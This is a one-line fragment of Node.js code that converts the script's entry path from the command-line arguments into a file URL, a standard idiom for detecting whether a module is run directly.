 const entry = process.argv[1] ? pathToFileURL(process.argv[1]).href : "";
